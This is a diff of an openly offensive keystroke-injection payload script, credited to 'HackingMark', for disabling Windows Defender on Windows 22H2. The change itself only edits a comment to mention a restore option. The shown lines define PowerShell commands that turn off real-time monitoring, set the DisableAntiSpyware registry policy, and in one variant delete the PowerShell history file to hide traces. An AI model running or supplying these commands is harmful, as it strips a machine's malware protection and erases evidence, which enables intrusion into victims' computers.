@@ -3,7 +3,9 @@
           REM Author HackingMark
           REM Disables Tampering Protection and Kills Windows Defender on Win 22H2
           REM Tested on German Computers
-          REM Uncomment DISABLE_WINDOWS_DEFENDER() at the end to use it within the Extension or call it later in your Payload.
+          REM Uncomment DISABLE_WINDOWS_DEFENDER() or RESTORE() at the end to use it within the Extension or call it later in your Payload.
+          
+          
 REM Attack Commands for disabling RTP and Defender with (T)/without(F) clearing or (R) Restore
 DEFINE ATTACK_F Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; exit;
 DEFINE ATTACK_T Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; Remove-Item (Get-PSReadlineOption).HistorySavePath; exit;
